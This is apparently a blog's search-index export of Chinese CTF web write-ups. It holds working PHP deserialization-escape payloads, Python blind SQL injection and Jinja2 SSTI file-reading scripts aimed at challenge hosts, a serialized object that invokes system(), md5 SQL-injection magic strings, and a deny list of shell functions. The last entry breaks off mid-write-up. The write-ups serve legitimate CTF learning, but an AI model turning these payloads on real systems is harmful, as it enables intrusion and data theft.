<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019安询杯easyseailize</title>
    <url>/2020/11/20/2019%E5%AE%89%E8%AF%A2%E6%9D%AFeasyseailize/</url>
    <content><![CDATA[<h1 id="1-考点"><a href="#1-考点" class="headerlink" title="1.考点"></a>1.考点</h1><p>反序列化，变量覆盖，代码审计</p>
<h1 id="2出发思路"><a href="#2出发思路" class="headerlink" title="2出发思路"></a>2出发思路</h1><p>这道题目开局就放出来了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">echo</span> $_SESSION[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看最下面的，让你去phpinfo下面看，其实能找到一个文件：</p>
<p><img src="image-20201120172012249.png" alt="image-20201120172012249"></p>
<p>再上下查找，我们还可以看见一个file_get_contents函数，那么我们的目标就很明确</p>
<ol>
<li>控制img变量</li>
<li>向上看，那么就是控制$serialize_info</li>
<li>继续向上，就是控制$_SESSION</li>
</ol>
<p>那我们的目标就很明确了，就是尝试控制$_SESSION的值，进行反序列化的那么一个操作，但是这里我们能控制的参数一个也没有，好在题目给出了一个利用点</p>
<h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure>

<p>该函数可以允许动态的变量，PHP中使用它的原意是想要令程序员可以程序中动态的调整常量，但是如果允许用户来调用的话就会出现变量覆盖的问题，</p>
<p>利用方式为我们想要修改的地方，如果是允许用户自定义的修改$_POST的内容，而我们想要修改session当中的值的时候，只需要</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=admin</span><br></pre></td></tr></table></figure>

<p>如果想要修改get当中的参数实际上也是可以的</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_GET[admin]=123</span><br></pre></td></tr></table></figure>

<p>修改部分代码如下：</p>
<p><img src="image-20201120173537064.png" alt="image-20201120173537064"></p>
<p>例子如下：</p>
<p><img src="image-20201120173027594.png" alt="image-20201120173027594"></p>
<p>可以看见我们的session为guest，利用extract函数我们就可以进行覆盖了：</p>
<p><img src="image-20201120173501957.png" alt="image-20201120173501957"></p>
<h3 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看这段代码，乍一看好像是对我们想要输出的东西进行了相当严格的过滤，但是它仅仅是将我们输入的值替换为空，而不是die掉程序，结合反序列化的逃逸，我们就可以轻松的输出我们需要的内容</p>
<p>首先需要明白这道题目到底做了什么，假设我们什么参数也不传入，我们看见的字符串如下：</p>
<p><img src="image-20201120180809647.png" alt="image-20201120180809647"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>正常来说，我们是不可以控制这里面的值的，但是通过变量覆盖我们就可以控制其中的值了，但是又恰恰因为是变量覆盖的原因，我们如果单纯的写入function会因为前面已经有function了而无法写入，此时我们需要做的就是把前面的东西吃掉自己写入！这样就可以了！！！！！！！！！！！</p>
<p>而我们可以控制的user当中的guest，此时我们需要吃掉的字符串键位</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;gura&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflagflag&amp;_SESSION[function]=1bbbb&quot;;s:8:&quot;function&quot;;s:5:&quot;ysllz&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>读到了文件，成功，</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>2020上海市网络安全大赛</title>
    <url>/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<p>注入杯，感觉也是自闭的一天orz,垃圾文章，只不过是记录一下脚本</p>
<h1 id="千毒网盘"><a href="#千毒网盘" class="headerlink" title="千毒网盘"></a>千毒网盘</h1><p><img src="2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/QGuEzupA6iniGX9V.png!thumbnail" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162</span><br></pre></td></tr></table></figure>

<p>在这个🔗下我们可以找到的！利用比较简单，如果我们需要的参数在get上，可以构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code = xx</span><br><span class="line">_GET[code] =xx</span><br><span class="line">只需要两者保持一致即可</span><br></pre></td></tr></table></figure>

<p>如果在POST上，则反过来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[code] =xx</span><br><span class="line">code =xx</span><br></pre></td></tr></table></figure>



<p>由于$$key_2 == $value_2使得POST的值被unset了，绕过waf，后面再次extract造成变量覆盖 然后是布尔盲注，这里用–+代替#，不然会出现错误情况</p>
<p>队里师傅的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    l=<span class="number">28</span></span><br><span class="line">    h=<span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(h - l) &gt; <span class="number">1</span>:</span><br><span class="line">        m=(l+h)/<span class="number">2</span></span><br><span class="line">        pay=<span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line">        <span class="comment">#pay=&quot;database()&quot;</span></span><br><span class="line">        e = <span class="string">&quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pay, i, m)</span><br><span class="line">        data = <span class="string">&quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;])</span></span><br><span class="line">        re=requests.post(url+<span class="string">&quot;?_POST[code]=&quot;</span>+data.strip(<span class="string">&#x27;code=&#x27;</span>),data=data,headers=headers)</span><br><span class="line">        <span class="comment">#print(re.text)</span></span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#exit()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;http://gamectf.com/p/CGBU.png&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            l=m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h=m</span><br><span class="line">    mid_num = <span class="built_in">int</span>((l + h + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    text += <span class="built_in">chr</span>(<span class="built_in">int</span>(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="TryToLogin"><a href="#TryToLogin" class="headerlink" title="TryToLogin"></a>TryToLogin</h1><p>这道题目是格式化字符串注入，感觉有必要学习一下,sprintf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line">text&#x3D;&#39;&#39;</span><br><span class="line">proxies&#x3D;&#123;</span><br><span class="line">&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    l&#x3D;28</span><br><span class="line">    h&#x3D;126</span><br><span class="line">    while abs(h - l) &gt; 1:</span><br><span class="line">        m&#x3D;(l+h)&#x2F;2</span><br><span class="line">        pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br><span class="line">        pay&#x3D;&quot;select * from fl4g&quot;</span><br><span class="line">        e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m)</span><br><span class="line">        data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39;</span><br><span class="line">        re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers)</span><br><span class="line">        if &#39;登录成功了&#39; in re.text:</span><br><span class="line">            l&#x3D;m</span><br><span class="line">        else:</span><br><span class="line">            h&#x3D;m</span><br><span class="line">    text +&#x3D; chr(int(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>这道题比较新有意思的点在两个地方：</p>
<p>过滤了这个地方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>

<p>过滤了左右花括号,这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>如果满足条件，则会输出<del>p0</del>，否则就不会输出。第二点，我们该读取什么文件呢？</p>
<p>这里运用了os.system(“rm -f /flag”)</p>
<p>默认的进程删除后会存放在暂时文件中，进程为：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>

<p>故编写脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>2020网鼎杯phpweb</title>
    <url>/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/</url>
    <content><![CDATA[<h1 id="1-访问页面"><a href="#1-访问页面" class="headerlink" title="1.访问页面"></a>1.访问页面</h1><p>curl+u，可以查看到这些：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">id</span>=<span class="string">form1</span> <span class="attr">name</span>=<span class="string">form1</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">func</span> <span class="attr">name</span>=<span class="string">func</span> <span class="attr">value</span>=<span class="string">&#x27;date&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">p</span> <span class="attr">name</span>=<span class="string">p</span> <span class="attr">value</span>=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话我们推测它就是用了一个call_user_func的回调函数..</p>
<p>然后自己在这里卡了很久，最后才想起来file_get_contents函数可以读文件，</p>
<p>于是构造：</p>
<p><img src="image-20201028192957104.png" alt="image-20201028192957104"></p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我又卡住了，看似好像是反序列化，又好像不是啊？找不到反序列化的点，一时间又僵住了，过了一会儿看了大佬的WP才意识到是自己思路还不够灵活，这道题没有unserialize，但是可以动调函数，审计代码中的Test类，其实他是有gettime的，这个函数就是一个动调函数，那我们的思路就很明确</p>
<h1 id="2-构造payload"><a href="#2-构造payload" class="headerlink" title="2.构造payload"></a>2.构造payload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __destruct() &#123;</span></span><br><span class="line"><span class="comment">//        if ($this-&gt;func != &quot;&quot;) &#123;</span></span><br><span class="line"><span class="comment">//            echo gettime($this-&gt;func, $this-&gt;p);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> (serialize($test));</span><br></pre></td></tr></table></figure>

<p>之后将这一段带入到题目当中，最终在tmp目录下找到</p>
<p><img src="image-20201028192936143.png" alt="image-20201028192936143"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>2021虎符杯部分web</title>
    <url>/2021/04/03/2021%E8%99%8E%E7%AC%A6%E6%9D%AF%E9%83%A8%E5%88%86web/</url>
    <content><![CDATA[<h1 id="“慢慢做”管理系统"><a href="#“慢慢做”管理系统" class="headerlink" title="“慢慢做”管理系统"></a>“慢慢做”管理系统</h1><p>这道题是sql和ssrf的结合，感觉还是挺有意思的。可惜自己SSRF真的菜，</p>
<p>第一步比较坑，这个比较难想到..</p>
<p>不过好险后门给了hint：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。</span><br><span class="line">第一步登录的sql语句是&quot;SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27; limit 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>那我们尝试ffifdyop，结果被过滤了，不过没事，还有另外几个payload：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">4611686052576742364</span><br><span class="line">e58</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure>

<p>随后打一个都可以。</p>
<p>进去之后允许我们打ssrf了，</p>
<p><img src="image-20210403203653415.png" alt="image-20210403203653415"></p>
<p>这个提示很明显了，用gopher协议去打，可惜自己并不会ssrf【】。</p>
<p>看了篇这个文章，发现可以试试看这个：</p>
